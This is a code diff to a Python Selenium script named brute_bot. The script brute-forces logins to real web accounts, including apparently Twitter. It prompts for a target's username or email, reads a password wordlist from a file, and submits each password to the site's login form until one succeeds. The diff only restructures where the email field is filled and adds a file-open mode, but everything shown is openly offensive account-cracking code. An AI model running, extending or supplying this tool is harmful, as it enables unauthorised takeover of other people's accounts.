@@ -28,11 +28,13 @@ class brute_bot(object):
         driver = self.driver
         pass_found = False
         driver.get(self.site)
-        email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
-        email_box.clear()
-        email_box.send_keys(self.email)
+
 
         if sys.argv[1] != "twitter":
+            email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
+            email_box.clear()
+            email_box.send_keys(self.email)
+
             while not pass_found:
                 time.sleep(3)
                 for i in self.password:
@@ -51,6 +53,10 @@ class brute_bot(object):
                             break
 
         else:
+            email_box = driver.find_element_by_class_name(f'{self.email_field}')
+            email_box.clear()
+            email_box.send_keys(self.email) 
+
             while not pass_found:
                 time.sleep(3)
                 for i in self.password:
@@ -115,7 +121,7 @@ def main_menu():
         efield = 'js-username-field'
         pfield = 'js-password-field'
         email1 = str(input("\nThe Username/Email of the Target >> "))
-        target = open(sys.argv[2])
+        target = open(sys.argv[2], 'r')
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
         execute.bruteforcer()
@@ -127,7 +133,7 @@ def main_menu():
         efield = 'login_email'
         pfield = 'login_password'
         email1 = str(input("\nThe Email of the Target >> "))
-        target = open(sys.argv[2])
+        target = open(sys.argv[2], 'r')
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
         execute.bruteforcer()
